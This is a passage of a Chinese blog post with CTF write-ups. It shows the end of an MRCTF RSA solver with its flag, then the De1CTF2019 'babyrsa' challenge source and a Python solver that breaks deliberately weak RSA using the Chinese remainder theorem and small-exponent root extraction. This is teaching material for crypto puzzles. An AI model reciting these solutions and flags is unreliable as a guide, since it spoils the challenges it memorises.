class="number">14057332139537395701238463644827948204030576528558543283405966933509944444681257521108769303999679955371474546213196051386802936343092965202519504111238572269823072199039812208100301939365080328518578704076769147484922508482686658959347725753762078590928561862163337382463252361958145933210306431342748775024336556028267742021320891681762543660468484018686865891073110757394154024833552558863671537491089957038648328973790692356014778420333896705595252711514117478072828880198506187667924020260600124717243067420876363980538994101929437978668709128652587073901337310278665778299513763593234951137512120572797739181693</span></span><br><span class="line">P_F_n =  <span class="number">14057332139537395701238463644827948204030576528558543283405966933509944444681257521108769303999679955371474546213196051386802936343092965202519504111238572269823072199039812208100301939365080328518578704076769147484922508482686658959347725753762078590928561862163337382463252361958145933210306431342748775024099427363967321110127562039879018616082926935567951378185280882426903064598376668106616694623540074057210432790309571018778281723710994930151635857933293394780142192586806292968028305922173313521186946635709194350912242693822450297748434301924950358561859804256788098033426537956252964976682327991427626735740</span></span><br><span class="line">Q_n =  <span class="number">20714298338160449749545360743688018842877274054540852096459485283936802341271363766157976112525034004319938054034934880860956966585051684483662535780621673316774842614701726445870630109196016676725183412879870463432277629916669130494040403733295593655306104176367902352484367520262917943100467697540593925707162162616635533550262718808746254599456286578409187895171015796991910123804529825519519278388910483133813330902530160448972926096083990208243274548561238253002789474920730760001104048093295680593033327818821255300893423412192265814418546134015557579236219461780344469127987669565138930308525189944897421753947</span></span><br><span class="line">Q_E_D =  <span class="number">100772079222298134586116156850742817855408127716962891929259868746672572602333918958075582671752493618259518286336122772703330183037221105058298653490794337885098499073583821832532798309513538383175233429533467348390389323225198805294950484802068148590902907221150968539067980432831310376368202773212266320112670699737501054831646286585142281419237572222713975646843555024731855688573834108711874406149540078253774349708158063055754932812675786123700768288048445326199880983717504538825498103789304873682191053050366806825802602658674268440844577955499368404019114913934477160428428662847012289516655310680119638600315228284298935201</span></span><br><span class="line">Ciphertext =  <span class="number">40855937355228438525361161524441274634175356845950884889338630813182607485910094677909779126550263304194796000904384775495000943424070396334435810126536165332565417336797036611773382728344687175253081047586602838685027428292621557914514629024324794275772522013126464926990620140406412999485728750385876868115091735425577555027394033416643032644774339644654011686716639760512353355719065795222201167219831780961308225780478482467294410828543488412258764446494815238766185728454416691898859462532083437213793104823759147317613637881419787581920745151430394526712790608442960106537539121880514269830696341737507717448946962021</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_p</span>(<span class="params">n, phi</span>):</span><br><span class="line">    tmp1 = n - phi + <span class="number">1</span>  <span class="comment"># =p+q</span></span><br><span class="line">    tmp2 = gmpy2.isqrt(<span class="built_in">pow</span>(tmp1, <span class="number">2</span>) - <span class="number">4</span> * n)  <span class="comment"># =p-q</span></span><br><span class="line">    q = (tmp1 + tmp2) // <span class="number">2</span></span><br><span class="line">    p = n // q</span><br><span class="line">    factor2 = <span class="number">2021</span> * p + <span class="number">2020</span> * q</span><br><span class="line">    <span class="keyword">if</span> factor2 &lt; <span class="number">0</span>:</span><br><span class="line">        factor2 = (-<span class="number">1</span>) * factor2</span><br><span class="line">    <span class="keyword">return</span> sympy.nextprime(factor2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_q</span>(<span class="params">n, phi</span>):</span><br><span class="line">    tmp1 = n - phi + <span class="number">1</span>  <span class="comment"># =p+q</span></span><br><span class="line">    tmp2 = gmpy2.isqrt(<span class="built_in">pow</span>(tmp1, <span class="number">2</span>) - <span class="number">4</span> * n)  <span class="comment"># =p-q</span></span><br><span class="line">    q = (tmp1 + tmp2) // <span class="number">2</span></span><br><span class="line">    p = n // q</span><br><span class="line">    factor2 = <span class="number">2021</span> * p - <span class="number">2020</span> * q</span><br><span class="line">    <span class="keyword">if</span> factor2 &lt; <span class="number">0</span>:</span><br><span class="line">        factor2 = (-<span class="number">1</span>) * factor2</span><br><span class="line">    <span class="keyword">return</span> sympy.nextprime(factor2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = solve_p(P_n, P_F_n)</span><br><span class="line"></span><br><span class="line">K = ((Q_E_D - <span class="number">1</span>) // Q_n) + <span class="number">1</span></span><br><span class="line">phiq = (Q_E_D - <span class="number">1</span>) // K</span><br><span class="line"></span><br><span class="line">q = solve_q(Q_n, phiq)</span><br><span class="line">n = p * q</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(Ciphertext, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;MRCTF&#123;Ju3t_@_31mp13_que3t10n&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="De1CTF2019-babyrsa"><a href="#De1CTF2019-babyrsa" class="headerlink" title="[De1CTF2019]babyrsa"></a>[De1CTF2019]babyrsa</h4><p><strong>TAG: 复杂rsa的典范、中国剩余定理求解、小指数攻击</strong></p><p>这里</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> data <span class="keyword">import</span> e1, e2, p, q1p, q1q, hint, flag</span><br><span class="line"></span><br><span class="line">n = [</span><br><span class="line">    <span class="number">20129615352491765499340112943188317180548761597861300847305827141510465619670536844634558246439230371658836928103063432870245707180355907194284861510906071265352409579441048101084995923962148527097370705452070577098780246282820065573711015664291991372085157016901209114191068574208680397710042842835940428451949500607613634682684113208766694028789275748528254287705759528498986306494267817198340658241873024800336013946294891687591013414935237821291805123285905335762719823771647853378892868896078424572232934360940672962436849523915563328779942134504499568866135266628078485232098208237036724121481835035731201383423</span>,</span><br><span class="line">    <span class="number">31221650155627849964466413749414700613823841060149524451234901677160009099014018926581094879840097248543411980533066831976617023676225625067854003317018794041723612556008471579060428898117790587991055681380408263382761841625714415879087478072771968160384909919958010983669368360788505288855946124159513118847747998656422521414980295212646675850690937883764000571667574381419144372824211798018586804674824564606122592483286575800685232128273820087791811663878057827386379787882962763290066072231248814920468264741654086011072638211075445447843691049847262485759393290853117072868406861840793895816215956869523289231421</span>,</span><br><span class="line">    <span class="number">29944537515397953361520922774124192605524711306753835303703478890414163510777460559798334313021216389356251874917792007638299225821018849648520673813786772452822809546571129816310207232883239771324122884804993418958309460009406342872173189008449237959577469114158991202433476710581356243815713762802478454390273808377430685157110095496727966308001254107517967559384019734279861840997239176254236069001453544559786063915970071130087811123912044312219535513880663913831358790376650439083660611831156205113873793106880255882114422025746986403355066996567909581710647746463994280444700922867397754748628425967488232530303</span>,</span><br><span class="line">    <span class="number">25703437855600135215185778453583925446912731661604054184163883272265503323016295700357253105301146726667897497435532579974951478354570415554221401778536104737296154316056314039449116386494323668483749833147800557403368489542273169489080222009368903993658498263905567516798684211462607069796613434661148186901892016282065916190920443378756167250809872483501712225782004396969996983057423942607174314132598421269169722518224478248836881076484639837343079324636997145199835034833367743079935361276149990997875905313642775214486046381368619638551892292787783137622261433528915269333426768947358552919740901860982679180791</span>]</span><br><span class="line">c = [</span><br><span class="line">    <span class="number">19131432661217908470262338421299691998526157790583544156741981238822158563988520225986915234570037383888112724408392918113942721994125505014727545946133307329781747600302829588248042922635714391033431930411180545085316438084317927348705241927570432757892985091396044950085462429575440060652967253845041398399648442340042970814415571904057667028157512971079384601724816308078631844480110201787343583073815186771790477712040051157180318804422120472007636722063989315320863580631330647116993819777750684150950416298085261478841177681677867236865666207391847046483954029213495373613490690687473081930148461830425717614569</span>,</span><br><span class="line">    <span class="number">15341898433226638235160072029875733826956799982958107910250055958334922460202554924743144122170018355117452459472017133614642242411479849369061482860570279863692425621526056862808425135267608544855833358314071200687340442512856575278712986641573012456729402660597339609443771145347181268285050728925993518704899005416187250003304581230701444705157412790787027926810710998646191467130550713600765898234392350153965811595060656753711278308005193370936296124790772689433773414703645703910742193898471800081321469055211709339846392500706523670145259024267858368216902176489814789679472227343363035428541915118378163012031</span>,</span><br><span class="line">    <span class="number">18715065071648040017967211297231106538139985087685358555650567057715550586464814763683688299037897182845007578571401359061213777645114414642903077003568155508465819628553747173244235936586812445440095450755154357646737087071605811984163416590278352605433362327949048243722556262979909488202442530307505819371594747936223835233586945423522256938701002370646382097846105014981763307729234675737702252155130837154876831885888669150418885088089324534892506199724486783446267336789872782137895552509353583305880144947714110009893134162185382309992604435664777436197587312317224862723813510974493087450281755452428746194446</span>,</span><br><span class="line">    <span class="number">2282284561224858293138480447463319262474918847630148770112472703128549032592187797289965592615199709857879008271766433462032328498580340968871260189669707518557157836592424973257334362931639831072584824103123486522582531666152363874396482744561758133655406410364442174983227005501860927820871260711861008830120617056883514525798709601744088135999465598338635794275123149165498933580159945032363880613524921913023341209439657145962332213468573402863796920571812418200814817086234262280338221161622789516829363805084715652121739036183264026120868756523770196284142271849879003202190966150390061195469351716819539183797</span>]</span><br><span class="line">f = <span class="keyword">lambda</span> m, e, n, c: <span class="built_in">pow</span>(m, e, n) == c</span><br><span class="line"><span class="keyword">assert</span> (<span class="built_in">sum</span>(<span class="built_in">map</span>(f, [p] * <span class="number">4</span>, [<span class="number">4</span>] * <span class="number">4</span>, n, c)) == <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">ee1 = <span class="number">42</span></span><br><span class="line">ee2 = <span class="number">3</span></span><br><span class="line">ce1 = <span class="number">45722651786340123946960815003059322528810481841378247280642868553607692149509126962872583037142461398806689489141741494974836882341505234255325683219092163052843461632338442529011502378931140356111756932712822516814023166068902569458299933391973504078898958921809723346229893913662577294963528318424676803942288386430172430880307619748186863890050113934573820505570928109017842647598266634344447182347849367714564686341871007505886728393751147033556889217604647355628557502208364412269944908011305064122941446516990168924709684092200183860653173856272384</span></span><br><span class="line">ce2 = <span class="number">13908468332333567158469136439932325992349696889129103935400760239319454409539725389747059213835238373047899198211128689374049729578146875309231962936554403287882999967840346216695208424582739777034261079550395918048421086843927009452479936045850799096750074359160775182238980989229190157551197830879877097703347301072427149474991803868325769967332356950863518504965486565464059770451458557744949735282131727956056279292800694203866167270268988437389945703117070604488999247750139568614939965885211276821987586882908159585863514561191905040244967655444219603287214405014887994238259270716355378069726760953320025828158</span></span><br><span class="line">tmp = <span class="number">864078778078609835167779565982540757684070450697854309005171742813414963447462554999012718960925081621571487444725528982424037419052194840720949809891134854871222612682162490991065015935449289960707882463387</span></span><br><span class="line">n = <span class="number">15911581555796798614711625288508309704791837516232122410440958830726078821069050404012820896260071751380436992710638364294658173571101596931605797509712839622479368850251206419748090059752427303611760004621378226431226983665746837779056271530181865648115862947527212787824629516204832313026456390047768174765687040950636530480549014401279054346098030395100387004111574278813749630986724706263655166289586230453975953773791945408589484679371854113457758157492241225180907090235116325034822993748409011554673180494306003272836905082473475046277554085737627846557240367696214081276345071055578169299060706794192776825039</span></span><br><span class="line"><span class="keyword">assert</span> (<span class="built_in">pow</span>(e1, ee1, n) == ce1)</span><br><span class="line"><span class="keyword">assert</span> (<span class="built_in">pow</span>(e2 + tmp, ee2, n) == ce2)</span><br><span class="line"></span><br><span class="line">e = <span class="number">46531</span></span><br><span class="line">n = <span class="number">16278524034278364842964386062476113517067911891699789991355982121084973951738324063305190630865511554888330215827724887964565979607808294168282995825864982603759381323048907814961279012375346497781046417204954101076457350988751188332353062731641153547102721113593787978587135707313755661153376485647168543680503160420091693269984008764444291289486805840439906620313162344057956594836197521501755378387944609246120662335790110901623740990451586621846212047950084207251595169141015645449217847180683357626383565631317253913942886396494396189837432429078251573229378917400841832190737518763297323901586866664595327850603</span></span><br><span class="line">c = <span class="number">14992132140996160330967307558503117255626925777426611978518339050671013041490724616892634911030918360867974894371539160853827180596100892180735770688723270765387697604426715670445270819626709364566478781273676115921657967761494619448095207169386364541164659123273236874649888236433399127407801843412677293516986398190165291102109310458304626261648346825196743539220198199366711858135271877662410355585767124059539217274691606825103355310348607611233052725805236763220343249873849646219850954945346791015858261715967952461021650307307454434510851869862964236227932964442289459508441345652423088404453536608812799355469</span></span><br><span class="line">hint = <span class="built_in">int</span>(binascii.hexlify(hint), <span class="number">16</span>)</span><br><span class="line"><span class="keyword">assert</span> (q1p * q1q == n)</span><br><span class="line"><span class="keyword">assert</span> (q1p &lt; q1q)</span><br><span class="line"><span class="keyword">assert</span> (c == <span class="built_in">pow</span>(hint, e, n))</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">int</span>(binascii.hexlify(flag), <span class="number">16</span>)</span><br><span class="line">q1 = q1p</span><br><span class="line">q2 = <span class="number">114401188227479584680884046151299704656920536168767132916589182357583461053336386996123783294932566567773695426689447410311969456458574731187512974868297092638677515283584994416382872450167046416573472658841627690987228528798356894803559278308702635288537653192098514966089168123710854679638671424978221959513</span></span><br><span class="line">c1 = <span class="number">262739975753930281690942784321252339035906196846340713237510382364557685379543498765074448825799342194332681181129770046075018122033421983227887719610112028230603166527303021036386350781414447347150383783816869784006598225583375458609586450854602862569022571672049158809874763812834044257419199631217527367046624888837755311215081173386523806086783266198390289097231168172692326653657393522561741947951887577156666663584249108899327053951891486355179939770150550995812478327735917006194574412518819299303783243886962455399783601229227718787081785391010424030509937403600351414176138124705168002288620664809270046124</span></span><br><span class="line">c2 = <span class="number">7395591129228876649030819616685821899204832684995757724924450812977470787822266387122334722132760470911599176362617225218345404468270014548817267727669872896838106451520392806497466576907063295603746660003188440170919490157250829308173310715318925771643105064882620746171266499859049038016902162599261409050907140823352990750298239508355767238575709803167676810456559665476121149766947851911064706646506705397091626648713684511780456955453552020460909638016134124590438425738826828694773960514221910109473941451471431637903182205738738109429736425025621308300895473186381826756650667842656050416299166317372707709596</span></span><br><span class="line"><span class="keyword">assert</span> (c1 == <span class="built_in">pow</span>(flag, e1, p * q1))</span><br><span class="line"><span class="keyword">assert</span> (c2 == <span class="built_in">pow</span>(flag, e2, p * q2))</span><br></pre></td></tr></table></figure><p>最后求flag的这一步有些复杂。首先是看题目给出的两个式子就知道不是可以直接求得flag的，事实也正是如此。因为这里求得的<code>e1和phi1</code>、<code>e1和phi2</code>是有相同的最大公约数<strong>14</strong>的。可以先求出<code>m^14</code>这个值，然后再根据<code>q1、q2</code>跟<code>m^14</code>这个值的关系利用中国剩余定理求得关于<code>m^2</code>的另一个rsa的算式，可以直接求出m也就是flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">n = [</span><br><span class="line">    <span class="number">20129615352491765499340112943188317180548761597861300847305827141510465619670536844634558246439230371658836928103063432870245707180355907194284861510906071265352409579441048101084995923962148527097370705452070577098780246282820065573711015664291991372085157016901209114191068574208680397710042842835940428451949500607613634682684113208766694028789275748528254287705759528498986306494267817198340658241873024800336013946294891687591013414935237821291805123285905335762719823771647853378892868896078424572232934360940672962436849523915563328779942134504499568866135266628078485232098208237036724121481835035731201383423</span>,</span><br><span class="line">    <span class="number">31221650155627849964466413749414700613823841060149524451234901677160009099014018926581094879840097248543411980533066831976617023676225625067854003317018794041723612556008471579060428898117790587991055681380408263382761841625714415879087478072771968160384909919958010983669368360788505288855946124159513118847747998656422521414980295212646675850690937883764000571667574381419144372824211798018586804674824564606122592483286575800685232128273820087791811663878057827386379787882962763290066072231248814920468264741654086011072638211075445447843691049847262485759393290853117072868406861840793895816215956869523289231421</span>,</span><br><span class="line">    <span class="number">29944537515397953361520922774124192605524711306753835303703478890414163510777460559798334313021216389356251874917792007638299225821018849648520673813786772452822809546571129816310207232883239771324122884804993418958309460009406342872173189008449237959577469114158991202433476710581356243815713762802478454390273808377430685157110095496727966308001254107517967559384019734279861840997239176254236069001453544559786063915970071130087811123912044312219535513880663913831358790376650439083660611831156205113873793106880255882114422025746986403355066996567909581710647746463994280444700922867397754748628425967488232530303</span>,</span><br><span class="line">    <span class="number">25703437855600135215185778453583925446912731661604054184163883272265503323016295700357253105301146726667897497435532579974951478354570415554221401778536104737296154316056314039449116386494323668483749833147800557403368489542273169489080222009368903993658498263905567516798684211462607069796613434661148186901892016282065916190920443378756167250809872483501712225782004396969996983057423942607174314132598421269169722518224478248836881076484639837343079324636997145199835034833367743079935361276149990997875905313642775214486046381368619638551892292787783137622261433528915269333426768947358552919740901860982679180791</span>]</span><br><span class="line">c = [</span><br><span class="line">    <span class="number">19131432661217908470262338421299691998526157790583544156741981238822158563988520225986915234570037383888112724408392918113942721994125505014727545946133307329781747600302829588248042922635714391033431930411180545085316438084317927348705241927570432757892985091396044950085462429575440060652967253845041398399648442340042970814415571904057667028157512971079384601724816308078631844480110201787343583073815186771790477712040051157180318804422120472007636722063989315320863580631330647116993819777750684150950416298085261478841177681677867236865666207391847046483954029213495373613490690687473081930148461830425717614569</span>,</span><br><span class="line">    <span class="number">15341898433226638235160072029875733826956799982958107910250055958334922460202554924743144122170018355117452459472017133614642242411479849369061482860570279863692425621526056862808425135267608544855833358314071200687340442512856575278712986641573012456729402660597339609443771145347181268285050728925993518704899005416187250003304581230701444705157412790787027926810710998646191467130550713600765898234392350153965811595060656753711278308005193370936296124790772689433773414703645703910742193898471800081321469055211709339846392500706523670145259024267858368216902176489814789679472227343363035428541915118378163012031</span>,</span><br><span class="line">    <span class="number">18715065071648040017967211297231106538139985087685358555650567057715550586464814763683688299037897182845007578571401359061213777645114414642903077003568155508465819628553747173244235936586812445440095450755154357646737087071605811984163416590278352605433362327949048243722556262979909488202442530307505819371594747936223835233586945423522256938701002370646382097846105014981763307729234675737702252155130837154876831885888669150418885088089324534892506199724486783446267336789872782137895552509353583305880144947714110009893134162185382309992604435664777436197587312317224862723813510974493087450281755452428746194446</span>,</span><br><span class="line">    <span class="number">2282284561224858293138480447463319262474918847630148770112472703128549032592187797289965592615199709857879008271766433462032328498580340968871260189669707518557157836592424973257334362931639831072584824103123486522582531666152363874396482744561758133655406410364442174983227005501860927820871260711861008830120617056883514525798709601744088135999465598338635794275123149165498933580159945032363880613524921913023341209439657145962332213468573402863796920571812418200814817086234262280338221161622789516829363805084715652121739036183264026120868756523770196284142271849879003202190966150390061195469351716819539183797</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">a1, n1, a2, n2</span>):</span><br><span class="line">    d = gmpy2.gcd(n1, n2)</span><br><span class="line">    c = a2 - a1</span><br><span class="line">    <span class="keyword">if</span> c % d != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    c = (c % n2 + n2) % n2</span><br><span class="line">    c = c // d</span><br><span class="line">    n1 = n1 // d</span><br><span class="line">    n2 = n2 // d</span><br><span class="line">    c *= gmpy2.invert(n1, n2)</span><br><span class="line">    c %= n2</span><br><span class="line">    c *= n1 * d</span><br><span class="line">    c += a1</span><br><span class="line">    <span class="keyword">global</span> n3</span><br><span class="line">    <span class="keyword">global</span> a3</span><br><span class="line">    n3 = n1 * n2 * d</span><br><span class="line">    a3 = (c % n3 + n3) % n3</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exCRT</span>(<span class="params">a, n</span>):</span><br><span class="line">    a1 = a[<span class="number">0</span>]</span><br><span class="line">    n1 = n[<span class="number">0</span>]</span><br><span class="line">    le = <span class="built_in">len</span>(a)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, le):</span><br><span class="line">        a2 = a[i]</span><br><span class="line">        n2 = n[i]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> merge(a1, n1, a2, n2):</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">        a1 = a3</span><br><span class="line">        n1 = n3</span><br><span class="line">    <span class="keyword">global</span> mod</span><br><span class="line">    mod = n1</span><br><span class="line">    <span class="keyword">return</span> (a1 % n1 + n1) % n1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = exCRT(c, n)</span><br><span class="line">p = gmpy2.iroot(p, <span class="number">4</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"></span><br><span class="line">ee1 = <span class="number">42</span></span><br><span class="line">ee2 = <span class="number">3</span></span><br><span class="line">ce1 = <span class="number">45722651786340123946960815003059322528810481841378247280642868553607692149509126962872583037142461398806689489141741494974836882341505234255325683219092163052843461632338442529011502378931140356111756932712822516814023166068902569458299933391973504078898958921809723346229893913662577294963528318424676803942288386430172430880307619748186863890050113934573820505570928109017842647598266634344447182347849367714564686341871007505886728393751147033556889217604647355628557502208364412269944908011305064122941446516990168924709684092200183860653173856272384</span></span><br><span class="line">ce2 = <span class="number">13908468332333567158469136439932325992349696889129103935400760239319454409539725389747059213835238373047899198211128689374049729578146875309231962936554403287882999967840346216695208424582739777034261079550395918048421086843927009452479936045850799096750074359160775182238980989229190157551197830879877097703347301072427149474991803868325769967332356950863518504965486565464059770451458557744949735282131727956056279292800694203866167270268988437389945703117070604488999247750139568614939965885211276821987586882908159585863514561191905040244967655444219603287214405014887994238259270716355378069726760953320025828158</span></span><br><span class="line">tmp = <span class="number">864078778078609835167779565982540757684070450697854309005171742813414963447462554999012718960925081621571487444725528982424037419052194840720949809891134854871222612682162490991065015935449289960707882463387</span></span><br><span class="line">n = <span class="number">15911581555796798614711625288508309704791837516232122410440958830726078821069050404012820896260071751380436992710638364294658173571101596931605797509712839622479368850251206419748090059752427303611760004621378226431226983665746837779056271530181865648115862947527212787824629516204832313026456390047768174765687040950636530480549014401279054346098030395100387004111574278813749630986724706263655166289586230453975953773791945408589484679371854113457758157492241225180907090235116325034822993748409011554673180494306003272836905082473475046277554085737627846557240367696214081276345071055578169299060706794192776825039</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rune</span>(<span class="params">e, n, c</span>):</span><br><span class="line">    k = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x = c + k * n</span><br><span class="line">        <span class="keyword">if</span> gmpy2.iroot(x, e)[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">return</span> gmpy2.iroot(x, e)[<span class="number">0</span>]</span><br><span class="line">        k = k + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e1 = rune(ee1, n, ce1)</span><br><span class="line">e2 = rune(ee2, n, ce2) - tmp</span><br><span class="line"><span class="built_in">print</span>(e1, e2)</span><br><span class="line"></span><br><span class="line">e = <span class="number">46531</span></span><br><span class="line">n = <span class="number">16278524034278364842964386062476113517067911891699789991355982121084973951738324063305190630865511554888330215827724887964565979607808294168282995825864982603759381323048907814961279012375346497781046417204954101076457350988751188332353062731641153547102721113593787978587135707313755661153376485647168543680503160420091693269984008764444291289486805840439906620313162344057956594836197521501755378387944609246120662335790110901623740990451586621846212047950084207251595169141015645449217847180683357626383565631317253913942886396494396189837432429078251573229378917400841832190737518763297323901586866664595327850603</span></span><br><span class="line">c = <span class="number">14992132140996160330967307558503117255626925777426611978518339050671013041490724616892634911030918360867974894371539160853827180596100892180735770688723270765387697604426715670445270819626709364566478781273676115921657967761494619448095207169386364541164659123273236874649888236433399127407801843412677293516986398190165291102109310458304626261648346825196743539220198199366711858135271877662410355585767124059539217274691606825103355310348607611233052725805236763220343249873849646219850954945346791015858261715967952461021650307307454434510851869862964236227932964442289459508441345652423088404453536608812799355469</span></span><br><span class="line"><span class="comment"># 上面的这个n是可以在线分解的，但是线下的时候不能用在线的环境哎</span></span><br><span class="line">q1q = <span class="number">127587319253436643569312142058559706815497211661083866592534217079310497260365307426095661281103710042392775453866174657404985539066741684196020137840472950102380232067786400322600902938984916355631714439668326671310160916766472897536055371474076089779472372913037040153356437528808922911484049460342088834871</span></span><br><span class="line">q1p = n // q1q</span><br><span class="line"><span class="keyword">if</span> q1p &gt; q1q:</span><br><span class="line">    q1p, q1q = q1q, q1p</span><br><span class="line">d = gmpy2.invert(e, (q1p - <span class="number">1</span>) * (q1q - <span class="number">1</span>))</span><br><span class="line">hint = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(hint))</span><br><span class="line"><span class="comment"># b&#x27;orz...you.found.me.but.sorry.no.hint...keep.on.and.enjoy.it!&#x27;</span></span><br><span class="line"></span><br><span class="line">q1 = q1p</span><br><span class="line">q2 = <span class="number">114401188227479584680884046151299704656920536168767132916589182357583461053336386996123783294932566567773695426689447410311969456458574731187512974868297092638677515283584994416382872450167046416573472658841627690987228528798356894803559278308702635288537653192098514966089168123710854679638671424978221959513</span></span><br><span class="line">c1 = <span class="number">262739975753930281690942784321252339035906196846340713237510382364557685379543498765074448825799342194332681181129770046075018122033421983227887719610112028230603166527303021036386350781414447347150383783816869784006598225583375458609586450854602862569022571672049158809874763812834044257419199631217527367046624888837755311215081173386523806086783266198390289097231168172692326653657393522561741947951887577156666663584249108899327053951891486355179939770150550995812478327735917006194574412518819299303783243886962455399783601229227718787081785391010424030509937403600351414176138124705168002288620664809270046124</span></span><br><span class="line">c2 = <span class="number">7395591129228876649030819616685821899204832684995757724924450812977470787822266387122334722132760470911599176362617225218345404468270014548817267727669872896838106451520392806497466576907063295603746660003188440170919490157250829308173310715318925771643105064882620746171266499859049038016902162599261409050907140823352990750298239508355767238575709803167676810456559665476121149766947851911064706646506705397091626648713684511780456955453552020460909638016134124590438425738826828694773960514221910109473941451471431637903182205738738109429736425025621308300895473186381826756650667842656050416299166317372707709596</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(gmpy2.gcd(e2, (p - <span class="number">1</span>) * (q2 - <span class="number">1</span>)))</span><br><span class="line"><span 